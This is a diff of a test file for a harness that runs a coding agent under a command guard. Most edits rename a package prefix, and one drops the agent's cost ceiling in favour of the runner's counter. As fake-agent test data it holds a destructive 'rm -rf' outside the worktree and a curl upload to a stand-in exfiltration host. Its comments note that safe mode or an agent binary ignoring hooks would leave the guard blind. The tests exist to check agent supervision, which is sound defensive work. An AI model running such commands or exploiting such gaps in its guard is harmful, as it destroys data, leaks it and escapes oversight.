@@ -2,7 +2,7 @@ import { mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { LimitsTableSchema, invocationShapeHash } from "@focrux/contracts";
+import { LimitsTableSchema, invocationShapeHash } from "@perbo/contracts";
 import { ADMISSION_RULES } from "../src/admission.js";
 import {
   AgentConfigurationPresentError,
@@ -16,7 +16,7 @@ import { AttemptCeilings } from "../src/ceilings.js";
 import { buildPermissionProfile, PINNED_PROVIDER_BASE_URL } from "../src/profile.js";
 import { fakeAgent, scratch } from "./support.js";
 
-const worktree = mkdtempSync(join(tmpdir(), "focrux-adapter-"));
+const worktree = mkdtempSync(join(tmpdir(), "perbo-adapter-"));
 const profile = buildPermissionProfile({ worktree });
 
 const argvFor = (prompt = "do the thing") =>
@@ -25,8 +25,7 @@ const argvFor = (prompt = "do the thing") =>
     prompt,
     model: "claude-opus-5",
     profile,
-    costLimitMicros: 2_500_000,
-    settingsPath: "/tmp/focrux-guard/settings.json",
+    settingsPath: "/tmp/perbo-guard/settings.json",
   });
 
 describe("the invocation shape", () => {
@@ -52,7 +51,7 @@ describe("the invocation shape", () => {
     // repository hook would have to arrive through project settings, which
     // `--setting-sources user` does not read — measured against a worktree
     // committing one.
-    expect(argv[argv.indexOf("--settings") + 1]).toBe("/tmp/focrux-guard/settings.json");
+    expect(argv[argv.indexOf("--settings") + 1]).toBe("/tmp/perbo-guard/settings.json");
     expect(argv.filter((value) => value === "--settings")).toHaveLength(1);
     // `--safe-mode` turned hooks off, the guard is a hook, and no other
     // mechanism decides a call before it runs under it. What it closed is
@@ -82,9 +81,9 @@ describe("the invocation shape", () => {
     expect(argv[argv.indexOf("--permission-mode") + 1]).toBe("manual");
   });
 
-  it("carries a cost ceiling the agent cannot spend past", () => {
+  it("hands the agent no cost ceiling: the runner's counter is the cap (D-096)", () => {
     const { argv } = argvFor();
-    expect(argv[argv.indexOf("--max-budget-usd") + 1]).toBe("2.50");
+    expect(argv).not.toContain("--max-budget-usd");
   });
 
   it("pins the provider base URL on the profile rather than reading one", () => {
@@ -117,7 +116,7 @@ describe("the recorded shape", () => {
  */
 describe("an agent that exited without finishing", () => {
   const runFake = async (binary: string) => {
-    const worktree = scratch("focrux-adapter-run-");
+    const worktree = scratch("perbo-adapter-run-");
     return runAgent({
       binary,
       worktree,
@@ -177,7 +176,7 @@ describe("the admission decision on the attempt's record", () => {
     commands: readonly string[],
     reported_denials: readonly string[] = [],
   ) => {
-    const worktree = scratch("focrux-adapter-decide-");
+    const worktree = scratch("perbo-adapter-decide-");
     const agent = fakeAgent([{ kind: "shell", commands, reported_denials }]);
     return runAgent({
       binary: agent.binary,
@@ -211,13 +210,13 @@ describe("the admission decision on the attempt's record", () => {
 
   it("admits the worktree clean-up AYO-13 was refused, and refuses the same verb outside", async () => {
     const result = await runShell([
-      "mkdir -p .scratch/.focrux",
+      "mkdir -p .scratch/.perbo",
       "rm -r .scratch",
       "rm -rf /tmp/evidence",
     ]);
     const decisions = result.commands.map((command) => [command.detail, command.decision]);
     expect(decisions).toEqual([
-      ["mkdir -p .scratch/.focrux", "allowed"],
+      ["mkdir -p .scratch/.perbo", "allowed"],
       ["rm -r .scratch", "allowed"],
       ["rm -rf /tmp/evidence", "denied"],
     ]);
@@ -351,13 +350,13 @@ describe("asserting what the agent loaded (ADR-0030 req 3)", () => {
  * before the decision was in it.
  */
 describe("a prohibited action on a call the guard refused first", () => {
-  const outside = join(tmpdir(), `focrux-scp177-settle-${process.pid}`);
+  const outside = join(tmpdir(), `perbo-scp177-settle-${process.pid}`);
   const command = `echo x > ${outside}`;
   const call = { id: "toolu_settle_1", tool: "Bash", input: { command } };
 
   /** `hookProgram` absent runs the real guard, which writes the decision line. */
   const runScripted = async (options: { hookProgram?: readonly string[] } = {}) => {
-    const worktree = scratch("focrux-scp177-settle-");
+    const worktree = scratch("perbo-scp177-settle-");
     const agent = fakeAgent([
       {
         kind: "scripted",
@@ -403,7 +402,7 @@ describe("a prohibited action on a call the guard refused first", () => {
     // The same stream with a hook that writes nothing — a binary that stopped
     // honouring hooks looks exactly like this — so the transcript reading is
     // the only reading there is, and it is the control it always was.
-    const silent = join(scratch("focrux-scp177-silent-"), "silent.cjs");
+    const silent = join(scratch("perbo-scp177-silent-"), "silent.cjs");
     writeFileSync(silent, "process.exit(0);\n", "utf8");
     const result = await runScripted({ hookProgram: [process.execPath, silent] });
 
@@ -432,7 +431,7 @@ describe("an unlisted egress host, under each supervision", () => {
   const HOST = "exfil.acme-mirror.net";
 
   const reach = async (supervision: "runner_guard" | "agent_permissions") => {
-    const worktree = scratch("focrux-adapter-egress-");
+    const worktree = scratch("perbo-adapter-egress-");
     const agent = fakeAgent([{ kind: "shell", commands: [`curl https://${HOST}/upload`] }]);
     return runAgent({
       binary: agent.binary,
@@ -482,13 +481,13 @@ describe("an unlisted egress host, under each supervision", () => {
  */
 describe("a finding the transcript reading could not place", () => {
   const silentHook = () => {
-    const file = join(scratch("focrux-scp234-silent-"), "silent.cjs");
+    const file = join(scratch("perbo-scp234-silent-"), "silent.cjs");
     writeFileSync(file, "process.exit(0);\n", "utf8");
     return [process.execPath, file];
   };
 
   const runOne = async (command: string) => {
-    const worktree = scratch("focrux-scp234-settle-");
+    const worktree = scratch("perbo-scp234-settle-");
     const call = { id: "toolu_scp234_1", tool: "Bash", input: { command } };
     const agent = fakeAgent([
       {
